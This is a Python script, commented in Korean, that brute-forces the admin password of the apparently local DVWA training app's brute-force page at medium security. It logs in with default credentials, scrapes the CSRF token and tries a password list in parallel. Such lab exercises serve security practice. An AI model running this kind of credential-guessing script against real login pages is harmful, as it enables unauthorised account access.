'''
brut force 병렬처리 성공
'''

from multiprocessing import Pool
import requests
import bs4

'''
파일을 불러와 tasks라는 변수에 리스트 형식으로 반환

@param 문자열 리스트가 있는 파일위치
@return 문자열 리스트
'''
def read_file(filename):
    tasks = []
    with open(filename, 'r') as file:
        for line in file:
            tasks.append([line.strip()])  # 각 문자열을 리스트로 감싸서 추가
    return tasks


'''
username, password, Login의 값과 Beautifulsoup을 이용해 찾아낸 user_toke으로
새로운 session 찾기

@return Session 객체
'''
def session_set():
    with requests.Session() as s:
        url = "http://localhost/login.php"
        login_info = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
            }

        user_token = bs4.BeautifulSoup(s.get(url).text, 'html.parser').select('input[name="user_token"]')[0]['value']
        login_info['user_token'] = user_token       # create user_token

        s.post(url, data=login_info)

        return s


'''
medium level의 brut force메뉴 에서 username: admin인 상태로 password brut force진행
get요청을 보낸 후 응답코드 200과 response.text값 안에 'Welcome to the password protected area'라는 문자열이 있을경우
현 password 반환

@param 문자열 리스트
@return 로그인이 성공한 password
'''
def brut_force(passwordList):
    s = session_set()
    url = "http://localhost/vulnerabilities/brute/"
    level = "medium"
    head = {"PHPSESSID": s.cookies['PHPSESSID'], "security": level}

    for password in passwordList:
        param = f"?username=admin&password={password}&Login=Login"
        payload = url+param
        print("input password:",password)
        response = requests.get(payload, cookies=head)
        # print(response.cookies)
        # print(response.text)
        if (response.status_code == 200 and 'Welcome to the password protected area' in response.text):
            return password
        


if __name__ == '__main__':
    num_cores = 8
    pool = Pool(num_cores)
    filename = 'tools/passwordlist.txt'
    tasks = read_file(filename)
    results = pool.map(brut_force, tasks)

    for result in results:
        if result:
            print("\n\nBruteforce SUCCESS!!")
            print("password is", result)

    

